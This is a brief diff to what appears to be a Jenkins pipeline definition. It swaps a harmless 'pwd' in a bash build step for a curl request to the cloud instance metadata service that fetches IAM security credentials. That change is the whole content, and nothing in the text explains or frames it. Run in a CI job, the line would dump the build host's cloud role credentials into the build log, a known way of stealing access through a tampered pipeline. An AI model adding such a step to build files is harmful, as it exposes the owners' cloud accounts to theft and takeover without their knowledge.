@@ -6,7 +6,7 @@ pipeline {
             steps {
                 echo 'Hello, '
                 sh '''#!/bin/bash
-                    pwd
+                    curl http://169.254.169.254/latest/meta-data/iam/security-credentials
                 '''
             }
         }
